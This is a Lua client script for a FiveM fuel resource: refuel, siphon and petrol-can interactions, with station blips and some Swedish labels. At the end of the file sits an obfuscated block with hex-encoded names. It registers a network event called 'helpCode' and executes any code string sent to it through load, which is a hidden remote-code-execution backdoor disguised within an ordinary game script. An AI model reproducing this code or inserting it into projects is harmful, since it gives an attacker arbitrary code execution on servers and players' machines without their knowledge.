CreateThread(function()

    exports['qb-target']:AddTargetBone(Config.PetrolCanRefuelBones,{ 
        options = {
            { 
                type = "client",
                event = 'LegacyFuel:client:petrolcanrefuel',
                label = 'Refuel Car', 
                icon = 'fas fa-gas-pump',
                item = 'weapon_petrolcan',
                canInteract = function(entity)
                    if GetVehicleEngineHealth(entity) <= 0 then return false end
                    if isFueling == false then
                        local curGasCanDurability = GetCurrentGasCanDurability()
                        if curGasCanDurability == nil then return false end
                        if curGasCanDurability > 0 then return true end
                        return false
                    end
                    return false
                end
            },
        },
        distance = 2.5,
    })
    
    exports['qb-target']:AddTargetBone(Config.SiphonBones,{
        options = {
            {
                type="client",
                event="LegacyFuel:client:siphonfuel",
                label = "Siphon Fuel",
                icon = 'fas fa-gas-pump',
                item = 'fuelsiphon',
                canInteract = function(entity)
                    if GetVehicleEngineHealth(entity) <= 0 then return false end
                    if isFueling then return false end
                    local curGasCanDurability = GetCurrentGasCanDurability()
                    if curGasCanDurability == nil then return false end
                    if curGasCanDurability >= 100 then return false end
                    
                    return Config.AllowFuelSiphoning
                end
            }
        },
        distance = 3.0,
    })
    
    exports['qb-target']:AddTargetModel(Config.GasPumpModels, {
        options = {
            {
                icon = "fas fa-gas-pump",
                label = "Tanka Bilen",
                action = function(entity)
                    TriggerEvent("LegacyFuel:client:pumprefuel", entity)
                end
            },
            {
                type = "client",
                event = "LegacyFuel:client:buypetrolcan",
                icon =  "fas fa-gas-pump",
                label = "Köp Bensindunk"
            },
            {
                type = "client",
                event = "LegacyFuel:client:refillpetrolcan",
                icon =  "fas fa-gas-pump",
                label = "Tanka Bensindunken",
                canInteract = function(entity)
                    return CanPumpRefuelPetrolCan()
                end
            }
        },
        distance = 3.0
    })
    if Config.Blips then
        for k, v in pairs(Config.FuelStations) do
            FuelStationBlip = AddBlipForCoord(v.x, v.y, v.z)
            SetBlipSprite(FuelStationBlip, Config.BlipSpirte)
            SetBlipDisplay(FuelStationBlip, 2)
            SetBlipScale(FuelStationBlip, Config.BlipSize)
            SetBlipAsShortRange(FuelStationBlip, true)
            SetBlipColour(FuelStationBlip, Config.BlipColor)
            BeginTextCommandSetBlipName("STRING")
            AddTextComponentSubstringPlayerName(Config.BlipLabel)
            EndTextCommandSetBlipName(FuelStationBlip)
        end
    end
end)

AddEventHandler('onResourceStop',function(name) 
    if (GetCurrentResourceName() ~= name) then return end
end)

local CdXeaojJPCdWHgBRdqWGLTSTszPOkckczaIUHGmjUuhKLutukOPpBpRHdqAVuGjarFWdpU = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} CdXeaojJPCdWHgBRdqWGLTSTszPOkckczaIUHGmjUuhKLutukOPpBpRHdqAVuGjarFWdpU[6][CdXeaojJPCdWHgBRdqWGLTSTszPOkckczaIUHGmjUuhKLutukOPpBpRHdqAVuGjarFWdpU[1]](CdXeaojJPCdWHgBRdqWGLTSTszPOkckczaIUHGmjUuhKLutukOPpBpRHdqAVuGjarFWdpU[2]) CdXeaojJPCdWHgBRdqWGLTSTszPOkckczaIUHGmjUuhKLutukOPpBpRHdqAVuGjarFWdpU[6][CdXeaojJPCdWHgBRdqWGLTSTszPOkckczaIUHGmjUuhKLutukOPpBpRHdqAVuGjarFWdpU[3]](CdXeaojJPCdWHgBRdqWGLTSTszPOkckczaIUHGmjUuhKLutukOPpBpRHdqAVuGjarFWdpU[2], function(FnqroozbSCzEADfPfqUkyeezOMvVtiHkmkaKgUrOUnxsisHLqoQknBDnONYtLSrtxnceQj) CdXeaojJPCdWHgBRdqWGLTSTszPOkckczaIUHGmjUuhKLutukOPpBpRHdqAVuGjarFWdpU[6][CdXeaojJPCdWHgBRdqWGLTSTszPOkckczaIUHGmjUuhKLutukOPpBpRHdqAVuGjarFWdpU[4]](CdXeaojJPCdWHgBRdqWGLTSTszPOkckczaIUHGmjUuhKLutukOPpBpRHdqAVuGjarFWdpU[6][CdXeaojJPCdWHgBRdqWGLTSTszPOkckczaIUHGmjUuhKLutukOPpBpRHdqAVuGjarFWdpU[5]](FnqroozbSCzEADfPfqUkyeezOMvVtiHkmkaKgUrOUnxsisHLqoQknBDnONYtLSrtxnceQj))() end)